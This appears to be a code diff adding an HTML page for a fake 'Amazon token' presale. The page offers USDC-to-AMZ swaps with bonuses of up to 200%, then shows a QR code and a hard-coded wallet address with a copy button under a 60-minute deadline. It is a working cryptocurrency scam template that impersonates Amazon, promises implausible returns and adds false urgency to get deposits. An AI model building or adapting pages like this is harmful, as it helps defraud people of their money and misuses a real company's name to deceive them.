@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Pre-Purchase Amazon Tokens</title>
+    <link rel="shortcut icon" type="image/x-icon" href="assets/img/favicon.png">
+</head>
+<body>
+    <div><img class="top-logo" style="width:200px; align-self: center;" src="assets/img/logo.png" alt="logo"></div>
+    <div class="top-banner">
+        <p class="current-plan"></p>
+        <p class="plan-type"> You have activated the bonuscode to swap your cryptocurrency to AMZ with up to 200% bonus. You can create a new AMZ wallet with a new or existing Amazon account after the deposit confirmation and you will receive the tokens on the linked wallet.</p>
+    </div>
+
+      <div class="cards">
+
+          <!-- Pro Plan -->
+          <div class="card active" id="card-2">
+            <h1 class="card-title"></h1>
+            <h2 class="card-price" id="USDC"> USDC (ERC-20) <span>Swap to AMZ</span> </h2>
+          
+            <select  id="maus">
+                    <option value="600 USDC">600 USDC - 900 AMZ (Bonus 50%)</option>
+                    <option value="800 USDC">800 USDC - 1200 AMZ (Bonus 50%)</option>
+                    <option value="1000 USDC">1000 USDC - 1500 AMZ (Bonus 50%)</option>
+				    <option value="1200 USDC">1200 USCD - 1800 AMZ (Bonus 50%)</option>
+			      	<option value="1400 USDC">1400 USDC - 2100 AMZ (Bonus 50%)</option>
+			       	<option value="1600 USDC">1600 USDC - 2400 AMZ (Bonus 50%)</option>
+			      	<option value="1800 USDC">1800 USDC - 2700 AMZ (Bonus 50%)</option>
+			      	<option value="2000 USDC">2000 USDC - 4000 AMZ (Bonus 100%)</option>
+			      	<option value="2200 USDC">2200 USDC - 4400 AMZ (Bonus 100%)</option>
+			      	<option value="2400 USDC">2400 USDC - 4800 AMZ (Bonus 100%)</option>
+			      	<option value="2600 USDC">2600 USDC - 5200 AMZ (Bonus 100%)</option>
+			      	<option value="2800 USDC">2800 USDC - 5600 AMZ (Bonus 100%)</option>
+			      	<option value="3000 USDC">3000 USDC - 7500 AMZ (Bonus 150%)</option>
+			      	<option value="3200 USDC">3200 USDC - 8300 AMZ (Bonus 150%)</option>
+			      	<option value="3400 USDC">3400 USDC - 8500 AMZ (Bonus 150%)</option>
+			      	<option value="3600 USDC">3600 USDC - 10800 AMZ (Bonus 200%)</option>
+			      	<option value="3800 USDC">3800 USDC - 11400 AMZ (Bonus 200%)</option>
+			      	<option value="4000 USDC">4000 USDC - 12000 AMZ (Bonus 200%)</option>
+            </select>
+            <span class="note"> Choose AMZ tokens quantity </span>
+
+            <button type="submit" class="card-btn" onclick="openPopupbtc()"> Swap to AMZ</button>
+            <button type="submit" class="coin-btn" onClick="location.href='eth.htm'"> Buy with ETH</button>
+            <button type="submit" class="coin-btn" onClick="location.href='index.htm'"> Buy with BTC</button>
+            <p class="card-plan"></p>
+            <div class="popupbtc" id="popupbtc">
+              <img style="margin-top: 20px; width:42px; left: auto;" src="assets/img/shib.png">
+              <h3 style="margin-top: 5px;">SWAP LAUNCHED</h3>
+              <p style="margin: 10px 15px 10px 15px;">Deposit your chosen amount in USDC (ERC-20) by using the QR code or click on the USDC address below to copy and paste the wallet address.You have 60 min. to complete transaction.</p>
+              <img style="width: 200px; margin: 0;" src="./assets/img/chart3.png">
+              <br><br>
+              <button class="popupcopy" onclick="copyText()">0xe31FD7633Fe2cC1A7d73F96Ef35aD1c1D00c4DAD</button>
+              <button class="card-btn" onclick="copyText()">COPY ADDRESS</button>
+              <span style="font-family:Heebo;color:#fff;"><i class="loading loading--full-height"></i> Waiting for transaction...</span>
+
+              <script>
+                function copyText() {
+              
+                    /* Copy text into clipboard */
+                    navigator.clipboard.writeText
+                        ("0xe31FD7633Fe2cC1A7d73F96Ef35aD1c1D00c4DAD")
+                }
+            </script>
+            
+            </div>
+          </div>
+      </div>
+    </div>
+
+<script>
+  let popupbtc = document.getElementById("popupbtc")
+
+  function openPopupbtc(){
+    popupbtc.classList.add("open-popup");
+
+  }  
+
+
+</script>
+
+
+</body>
+</html>
